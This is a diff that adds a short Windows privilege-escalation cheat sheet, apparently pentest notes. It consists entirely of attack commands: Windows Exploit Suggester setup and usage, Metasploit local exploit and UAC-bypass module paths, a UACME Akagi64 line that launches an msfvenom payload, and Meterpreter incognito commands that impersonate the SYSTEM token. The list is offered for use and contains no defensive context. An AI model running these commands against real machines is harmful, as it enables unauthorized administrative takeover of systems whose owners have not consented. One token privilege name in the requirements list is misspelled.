@@ -1,0 +1,39 @@
+# WES install
+    wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py
+    python ./windows-exploit-suggester.py --update
+    pip install xlrd --upgrade
+
+# WES enum
+    ./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo systeminfo.txt
+
+# Metasploit post module
+    post/multi/recon/local_exploit_suggester
+
+# Metasploit exploit module
+    exploit/windows/local/bypassuac_injection
+    exploit/windows/local/bypassuac_dotnet_profiler
+    exploit/windows/local/bypassuac_eventvwr
+    exploit/windows/local/bypassuac_sdclt
+    exploit/windows/local/cve_2019_1458_wizardopium
+    exploit/windows/local/cve_2020_1054_drawiconex_lpe
+    exploit/windows/local/ms10_092_schelevator
+    exploit/windows/local/ms14_058_track_popup_menu
+    exploit/windows/local/ms15_051_client_copy_image
+    exploit/windows/local/ms16_014_wmi_recv_notif
+
+# UACME
+    Akagi64.exe 23 C:\Temp\[MSFVENOM-PAYLOAD.exe]
+
+# Token impersonation
+    load incognito
+    list_tokens -u
+    impersonate_token "NT AUTHORITY\SYSTEM"
+    
+    # requirements
+    meterpreter session
+    - one of the following tokens
+        - SeAssingPrimaryToken
+        - SeCreateToken
+        - SeImpersonatePrivilege
+
+
